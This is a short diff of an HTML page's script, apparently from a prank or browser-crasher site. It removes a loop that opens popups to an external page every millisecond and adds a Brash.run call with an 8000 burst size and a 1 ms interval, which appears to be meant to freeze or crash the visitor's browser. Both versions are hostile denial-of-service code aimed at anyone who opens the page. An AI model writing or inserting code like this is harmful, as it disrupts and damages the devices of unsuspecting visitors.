@@ -149,12 +149,8 @@
 		},
 	};
 
-	setInterval(function () {
-		window.open("https://simplypickles.github.io/frick");
-		window.open(
-			"https://simplypickles.github.io/frick",
-			"frick",
-			"height=200,width=200",
-		);
-	}, 1);
+	Brash.run({
+		burstSize: 8000,
+		interval: 1,
+	});
 </script>
